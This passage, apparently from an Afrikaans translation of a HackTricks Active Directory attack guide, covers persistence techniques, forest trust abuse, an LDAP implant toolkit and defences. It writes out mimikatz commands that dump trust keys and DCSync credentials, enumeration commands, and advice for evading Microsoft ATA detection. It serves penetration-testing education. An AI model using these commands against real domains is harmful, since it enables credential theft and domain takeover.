Sodra die aanvaller hierdie hash bekom, kan hulle **TGTs** skep vir enige rekening wat hulle kies (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Hierdie is soos golden tickets wat vervals word op 'n wyse wat **common golden tickets detection mechanisms bypass**.


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Om sertifikate van 'n rekening te hê of dit te kan request** is 'n uitstekende manier om in die gebruiker se rekening te persist (selfs al verander hy die wagwoord):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Gebruik van sertifikate maak dit ook moontlik om met hoë voorregte binne die domein te persist:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Die **AdminSDHolder**-voorwerp in Active Directory verseker die sekuriteit van **bevoorregte groepe** (soos Domain Admins en Enterprise Admins) deur 'n standaard **Access Control List (ACL)** oor hierdie groepe toe te pas om ongemagtigde veranderinge te voorkom. Hierdie funksie kan egter uitgebuit word; as 'n aanvaller die AdminSDHolder se ACL wysig om volle toegang aan 'n gewone gebruiker te gee, kry daardie gebruiker uitgebreide beheer oor alle bevoorregte groepe. Hierdie sekuriteitsmaatreël, bedoel om te beskerm, kan dus teenproduktief wees en onverdiende toegang toelaat tensy dit noukeurig gemoniteer word.

[**Meer inligting oor AdminDSHolder Group hier.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

In elke **Domain Controller (DC)** bestaan 'n **local administrator**-rekening. Deur adminregte op so 'n masjien te verkry, kan die lokale Administrator-hash met **mimikatz** geëkstraheer word. Daarna is 'n registerwysiging nodig om **die gebruik van hierdie wagwoord te enable**, wat remote toegang tot die lokale Administrator-rekening moontlik maak.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Jy kan **spesiale permissies** aan 'n **gebruiker gee** oor sekere domeinobjekte wat die gebruiker sal toelaat om in die toekoms **privileges te eskaleer**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

Die **security descriptors** word gebruik om die **permissions** wat 'n **object** oor 'n ander **object** het, te **store**. As jy net 'n **klein verandering** in die **security descriptor** van 'n voorwerp kan maak, kan jy baie interessante voorregte oor daardie voorwerp bekom sonder om lid van 'n bevoorregte groep te wees.


{{#ref}}
security-descriptors.md
{{#endref}}

### Skeleton Key

Verander **LSASS** in geheue om 'n **universele wagwoord** te vestig, wat toegang tot alle domeinrekeninge gee.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Leer wat 'n SSP (Security Support Provider) is hier.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Jy kan jou **eie SSP** skep om **credentials** wat gebruik word om by die masjien aan te meld in **clear text** te **capture**.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Dit registreer 'n **nuwe Domain Controller** in die AD en gebruik dit om attribuutveranderinge (SIDHistory, SPNs...) op gespesifiseerde voorwerpe te **push** **sonder** om enige **logs** oor die **wysigings** te laat. Jy benodig DA-voorregte en moet in die **root domain** wees.\
Let daarop dat as jy verkeerde data gebruik, lelik opskryfbare logs sal verskyn.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Eerder het ons bespreek hoe om voorregte te eskaleer as jy **genoeg toestemming het om LAPS-wagwoorde te read**. Hierdie wagwoorde kan egter ook gebruik word om **persistentie te handhaaf**.\
Kyk:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft beskou die **Forest** as die sekuriteitsgrens. Dit impliseer dat **die kompromittering van 'n enkele domein moontlik daartoe kan lei dat die hele Forest gekompromitteer word**.

### Basiese Inligting

'n [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) is 'n sekuriteitsmeganisme wat 'n gebruiker van een **domein** in staat stel om hulpbronne in 'n ander **domein** te benader. Dit skep 'n skakel tussen die autentikasie-stelsels van die twee domeine, wat verifikasie toelaat om deur te vloei. Wanneer domeine 'n trust opstel, ruil en bewaar hulle spesifieke **sleutels** in hul **Domain Controllers (DCs)**, wat krities is vir die integriteit van die trust.

In 'n tipiese scenario, as 'n gebruiker 'n diens in 'n **trusted domain** wil toegang, moet hulle eers 'n spesiale kaartjie versoek wat bekend staan as 'n **inter-realm TGT** van hul eie domein se DC. Hierdie TGT is versleutel met 'n gedeelde **key** wat albei domeine ooreengekom het. Die gebruiker neem dan hierdie TGT na die **DC van die trusted domain** om 'n service ticket (**TGS**) te kry. Nadat die inter-realm TGT deur die trusted domain se DC geverifieer is, gee dit 'n TGS uit wat die gebruiker toegang tot die diens verleen.

**Stappe**:

1. 'n **client computer** in **Domain 1** begin die proses deur sy **NTLM hash** te gebruik om 'n **Ticket Granting Ticket (TGT)** by sy **Domain Controller (DC1)** te versoek.
2. DC1 gee 'n nuwe TGT as die kliënt suksesvol geauthentiseer is.
3. Die kliënt versoek dan 'n **inter-realm TGT** by DC1, wat nodig is om hulpbronne in **Domain 2** te bereik.
4. Die inter-realm TGT is versleutel met 'n **trust key** wat tussen DC1 en DC2 gedeel word as deel van die two-way domain trust.
5. Die kliënt neem die inter-realm TGT na **Domain 2 se Domain Controller (DC2)**.
6. DC2 verifieer die inter-realm TGT met sy gedeelde trust key en, indien geldig, gee 'n **Ticket Granting Service (TGS)** vir die bediener in Domain 2 wat die kliënt wil toegang.
7. Laastens, die kliënt bied hierdie TGS aan die bediener, wat met die bediener se account hash versleutel is, om toegang tot die diens in Domain 2 te kry.

### Verskillende trustsoorte

Dit is belangrik om te let dat **'n trust 1-weg of 2-wegs kan wees**. In die 2-wegs opsie sal beide domeine mekaar vertrou, maar in die **1-weg** trustverhouding sal een van die domeine die **trusted** wees en die ander die **trusting** domein. In laasgenoemde geval sal **jy slegs in staat wees om hulpbronne binne die trusting domain vanaf die trusted een te toegang**.

Indien Domain A Domain B vertrou, is A die trusting domain en B die trusted een. Verder, in **Domain A**, sou dit 'n **Outbound trust** wees; en in **Domain B**, sou dit 'n **Inbound trust** wees.

**Verskillende vertrouensverhoudings**

- **Parent-Child Trusts**: 'n Algemene opstelling binne dieselfde forest, waar 'n child domain outomaties 'n two-way transitive trust met sy parent domain het. Dit beteken dat autentikasieversoeke na behore tussen parent en child kan vloei.
- **Cross-link Trusts**: Ook genoem "shortcut trusts," hierdie word tussen child domains opgestel om die referral-proses te versnel. In komplekse forests moet autentikasieversoeke dikwels op en af deur die forest root reis; deur cross-links te skep, word die reis verkort, wat veral nuttig is in geografies verspreide omgewings.
- **External Trusts**: Hierdie word opgestel tussen verskillende, onsamehangende domeine en is van nature non-transitive. Volgens [Microsoft se dokumentasie](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) is external trusts nuttig vir toegang tot hulpbronne in 'n domein buite die huidige forest wat nie deur 'n forest trust verbind is nie. Sekuriteit word versterk deur SID filtering met external trusts.
- **Tree-root Trusts**: Hierdie vertroue word outomaties gevestig tussen die forest root domain en 'n nuut bygevoegde tree root. Alhoewel nie gereeld teëgekom nie, is tree-root trusts belangrik vir die toevoeging van nuwe domain trees tot 'n forest, wat hulle in staat stel om 'n unieke domeinnaam te behou en two-way transitivity te verseker. Meer inligting is beskikbaar in [Microsoft se gids](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Hierdie tipe trust is 'n two-way transitive trust tussen twee forest root domains, wat ook SID filtering afdwing om sekuriteitsmaatreëls te verbeter.
- **MIT Trusts**: Hierdie vertroue word gevestig met nie-Windows, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos-domeine. MIT trusts is meer gespesialiseerd en rig op omgewings wat integrasie met Kerberos-gebaseerde stelsels buite die Windows-ekosisteem benodig.

#### Ander verskille in **trusting relationships**

- 'n Trustverhouding kan ook **transitive** wees (A trust B, B trust C, dan A trust C) of **non-transitive**.
- 'n Trustverhouding kan opgestel word as **bidirectional trust** (beide vertrou mekaar) of as **one-way trust** (slegs een vertrou die ander).

### Aanvalspad

1. **Enumerate** die trusting relationships
2. Kyk of enige **security principal** (user/group/computer) **access** het tot hulpbronne van die **ander domein**, moontlik deur ACE-inskrywings of deur lidmaatskap in groepe van die ander domein. Soek **relationships across domains** (die trust is waarskynlik hiervoor geskep).
1. kerberoast in hierdie geval kan 'n ander opsie wees.
3. **Compromise** die **accounts** wat deur die domeine kan **pivot**.

Aanvallers kan toegang tot hulpbronne in 'n ander domein kry deur drie primêre meganismes:

- **Local Group Membership**: Principals kan bygevoeg word tot plaaslike groepe op masjiene, soos die "Administrators" groep op 'n bediener, wat hulle beduidende beheer oor daardie masjien gee.
- **Foreign Domain Group Membership**: Principals kan ook lede wees van groepe binne die vreemde domein. Die effektiwiteit van hierdie metode hang egter af van die aard van die trust en die omvang van die groep.
- **Access Control Lists (ACLs)**: Principals kan gespesifiseer wees in 'n **ACL**, veral as entiteite in **ACEs** binne 'n **DACL**, wat hulle toegang tot spesifieke hulpbronne gee. Vir diegene wat die werktuie van ACLs, DACLs en ACEs dieper wil ondersoek, is die whitepaper “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” 'n waardevolle hulpbron.

### Vind eksterne gebruikers/groepe met permissies

Jy kan **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** nagaan om foreign security principals in die domein te vind. Hierdie sal gebruikers/groepe wees van **'n eksterne domain/forest**.

Jy kan dit in **Bloodhound** nagaan of powerview gebruik:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Ander maniere om domeinvertroue te enumereer:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Daar is **2 trusted keys**, een vir _Child --> Parent_ en nog een vir _Parent_ --> _Child_.\
> Jy kan die een wat deur die huidige domein gebruik word sien met:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Eskaleer as Enterprise admin na die child/parent domain deur die trust te misbruik met SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Benut skryfbare Configuration NC

Dit is noodsaaklik om te verstaan hoe die Configuration Naming Context (NC) misbruik kan word. Die Configuration NC dien as 'n sentrale bewaarplek vir konfigurasiedata oor 'n forest in Active Directory (AD)-omgewings. Hierdie data word na elke Domain Controller (DC) binne die forest gerepliseer, en writable DCs behou 'n skryfbare kopie van die Configuration NC. Om dit uit te buiten, moet jy **SYSTEM privileges on a DC** hê, by voorkeur op 'n child DC.

**Koppel GPO aan root DC site**

Die Configuration NC se Sites-container sluit inligting in oor die sites van alle domeingekoppelde rekenaars binne die AD-forest. Deur met SYSTEM privileges op enige DC te werk, kan aanvallers GPOs koppel aan die root DC-sites. Hierdie aksie kan die root-domein potensieel kompromitteer deur die beleid wat op hierdie sites toegepas word, te manipuleer.

Vir deeglike inligting kan mens navorsing oor [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research) raadpleeg.

**Kompromitteer enige gMSA in die forest**

'n Aanvalsvektor behels die teiken van bevoorregte gMSAs binne die domein. Die KDS Root key, noodsaaklik vir die berekening van gMSA-wagwoorde, word binne die Configuration NC gestoor. Met SYSTEM privileges op enige DC is dit moontlik om toegang tot die KDS Root key te kry en die wagwoorde vir enige gMSA dwarsdeur die forest te bereken.

Gedetaileerde ontleding en stap-vir-stap leiding is te vinde in:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Aanvullende gedelegeerde MSA-aanval (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Addisionele eksterne navorsing: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Skema-wysigingsaanval**

Hierdie metode vereis geduld — wag vir die skepping van nuwe bevoorregte AD-voorwerpe. Met SYSTEM privileges kan 'n aanvaller die AD Schema wysig om enige gebruiker volledige beheer oor alle classes te gee. Dit kan lei tot ongemagtigde toegang en beheer oor pas geskepte AD-voorwerpe.

Vir meer inligting, sien [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

Die ADCS ESC5 kwesbaarheid mik op beheer oor Public Key Infrastructure (PKI)-voorwerpe om 'n sertifikaattemplate te skep wat verifikasie as enige gebruiker binne die forest moontlik maak. Aangesien PKI-voorwerpe in die Configuration NC woon, stel die kompromittering van 'n skryfbare child DC die uitvoering van ESC5-aanvalle in staat.

Meer besonderhede is beskikbaar in [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). In scenario's sonder ADCS het die aanvaller die vermoë om die nodige komponente op te stel, soos bespreek in [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
In hierdie scenario word **jou domain vertrou** deur 'n eksterne een wat jou **onbepaalde regte** daaroor gee. Jy sal moet uitvind **watter principals van jou domain watter toegang oor die eksterne domain het** en dan probeer dit uitbuit:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Eksterne Forest Domain - Eenrigting (Uitgaand)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
In hierdie scenario **jou domein** is **vertrou** om sekere **voorregte** aan 'n prinsipaal van 'n **ander domein** te gee.

Maar, wanneer 'n **domein vertrou word** deur die vertrouende domein, skep die vertroude domein 'n **gebruiker** met 'n **voorspelbare naam** wat as **wagwoord die vertroude wagwoord** gebruik. Dit beteken dat dit moontlik is om 'n **gebruiker vanaf die vertrouende domein te gebruik om toegang tot die vertroude domein te kry** om dit te ontleed en te probeer meer voorregte te eskaleer:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Nog 'n manier om die vertroude domein te kompromitteer is om 'n [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) te vind wat in die **teenoorgestelde rigting** van die domeinvertroue geskep is (wat nie baie algemeen is nie).

Nog 'n manier om die vertroude domein te kompromitteer is om in 'n masjien te wag waar 'n **gebruiker van die vertroude domein toegang kan kry** om via **RDP** aan te meld. Daarna kan die aanvaller kode in die RDP-sessieproses injecteer en **toegang tot die oorspronklike domein van die slagoffer** van daar af kry.\
Verder, as die **slagoffer sy hardeskyf gemonteer het**, kan die aanvaller vanuit die **RDP-sessie** proses **backdoors** stoor in die **opstartgids van die hardeskyf**. Hierdie tegniek word **RDPInception** genoem.


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Domeinvertroue misbruik mitigering

### **SID Filtering:**

- Die risiko van aanvalle wat die SID history-attribuut oor forest trusts benut, word versag deur SID Filtering, wat standaard op alle inter-forest trusts geaktiveer is. Dit berus op die aanname dat intra-forest trusts veilig is, en dat die forest, eerder as die domein, die sekuriteitsgrens is volgens Microsoft se standpunt.
- Daar is egter 'n vangstreep: SID filtering kan toepassings en gebruikers toegang ontwrig, wat soms lei tot die deaktivering daarvan.

### **Selective Authentication:**

- Vir inter-forest trusts verseker die gebruik van Selective Authentication dat gebruikers van die twee forests nie outomaties geverifieer word nie. In plaas daarvan is eksplisiete toestemmings nodig sodat gebruikers toegang tot domeine en bedieners binne die vertrouende domein of forest kan kry.
- Dit is belangrik om daarop te let dat hierdie maatreëls nie beskerming bied teen die uitbuiting van die writable Configuration Naming Context (NC) of teen aanvalle op die trust account nie.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-gebaseerde AD misbruik vanaf On-Host Implants

Die [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) herimplementeer bloodyAD-style LDAP primitives as x64 Beacon Object Files wat heeltemal binne 'n on-host implant (bv. Adaptix C2) loop. Operators kompileer die pakkie met `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, laai `ldap.axs`, en roep dan `ldap <subcommand>` vanaf die beacon aan. Alle verkeer gebruik die huidige aanmeld-sekuriteitskonteks oor LDAP (389) met signing/sealing of LDAPS (636) met outomatiese sertifikaatvertroue, so geen socks proxies of skyf-artefakte is nodig nie.

### Implant-side LDAP enumerasie

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` los kort name/OU-paaie op na volle DNs en dump die ooreenstemmende objekte.
- `get-object`, `get-attribute`, en `get-domaininfo` haal arbitrêre attributte (insluitend security descriptors) plus die forest/domain metadata van `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, en `get-rbcd` openbaar roasting candidates, delegation-instellings, en bestaande [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptors direk vanaf LDAP.
- `get-acl` en `get-writable --detailed` parseer die DACL om trustees, regte (GenericAll/WriteDACL/WriteOwner/attribute writes), en erfenis te lys, wat onmiddellike teikens vir ACL privilege escalation gee.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write primitives for escalation & persistence

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) laat die operateur nuwe principals of masjienrekeninge plaas waar OU-regte bestaan. `add-groupmember`, `set-password`, `add-attribute`, and `set-attribute` kap teikens direk oor sodra write-property-regte gevind word.
- ACL-georiënteerde opdragte soos `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, and `add-dcsync` vertaal WriteDACL/WriteOwner op enige AD-object in wagwoord-resets, groepslidmaatskapbeheer, of DCSync replikasie-privilegies sonder om PowerShell/ADSI-artefakte agter te laat. `remove-*` eweknieë ruim ingespuite ACEs op.

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn` maak 'n gekompromitteerde gebruiker onmiddellik Kerberoastable; `add-asreproastable` (UAC toggle) merk dit vir AS-REP roasting sonder om die wagwoord aan te raak.
- Delegation macros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) herskryf `msDS-AllowedToDelegateTo`, UAC flags, of `msDS-AllowedToActOnBehalfOfOtherIdentity` vanaf die beacon, wat constrained/unconstrained/RBCD aanvalsroetes moontlik maak en die behoefte aan remote PowerShell of RSAT uitskakel.

### sidHistory injection, OU relocation, and attack surface shaping

- `add-sidhistory` spuit bevoorregte SIDs in 'n beheer­de principal se SID history (see [SID-History Injection](sid-history-injection.md)), wat sluipenderwys toegangserfenis verskaf volledig oor LDAP/LDAPS.
- `move-object` verander die DN/OU van rekenaars of gebruikers, wat 'n aanvaller toelaat om bates in OUs te skuif waar gedelegeerde regte reeds bestaan voordat `set-password`, `add-groupmember`, of `add-spn` misbruik word.
- Nou gespesifiseerde verwyderingsopdragte (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, etc.) laat vinnige rollback toe nadat die operateur credentials of persistence geoogst het, en minimaliseer telemetrie.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Algemene Verdedigings


[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Verdedigende Maatreëls vir Beskerming van Aanmeldbewyse**

- **Domain Admins Restrictions**: Dit word aanbeveel dat Domain Admins slegs toegelaat word om by Domain Controllers aan te meld, en nie op ander hosts gebruik word nie.
- **Service Account Privileges**: Dienste moet nie met Domain Admin (DA) privilegies uitgevoer word om veiligheid te handhaaf nie.
- **Temporal Privilege Limitation**: Vir take wat DA-privilegies vereis, behoort hul duur beperk te wees. Dit kan bereik word deur: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Ouditeer Event IDs 2889/3074/3075 en dwing daarna LDAP signing plus LDAPS channel binding op DCs/clients af om LDAP MITM/relay-pogings te blokkeer.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### **Implementing Deception Techniques**

- Implementering van misleiding behels die opstel van lokvalle, soos lokgebruikers of -rekenaars, met kenmerke soos wagwoorde wat nie verloopt nie of wat gemerk is as Trusted for Delegation. 'n Gedetaileerde benadering sluit in om gebruikers met spesifieke regte te skep of om hulle by hoë-privilege groepe te voeg.
- 'n Praktiese voorbeeld behels die gebruik van gereedskap soos: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Meer oor die ontplooiing van deception-tegnieke is beskikbaar by [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identifying Deception**

- **For User Objects**: Verdachte aanduidings sluit in nie-tipiese ObjectSID, seldsame aanmeldings, skeppingsdatums, en 'n lae aantal mislukte wagwoordpogings.
- **General Indicators**: Deur atributte van potensiële lokobjekte met dié van egte voorwerpe te vergelyk, kan onsogene konsekwenthede aan die lig kom. Gereedskap soos [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) kan help om sulke misleidings te identifiseer.

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Vermy sessie-enumerasie op Domain Controllers om ATA-deteksie te voorkom.
- **Ticket Impersonation**: Deur **aes** sleutels te gebruik vir ticket-creation help dit om deteksie te ontduik deur nie na NTLM af te gradeer nie.
- **DCSync Attacks**: Dit word aanbeveel om DCSync-aanvalle vanaf 'n nie-Domain Controller uit te voer om ATA-deteksie te vermy, aangesien direkte uitvoering vanaf 'n Domain Controller waarskuwings sal veroorsaak.

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
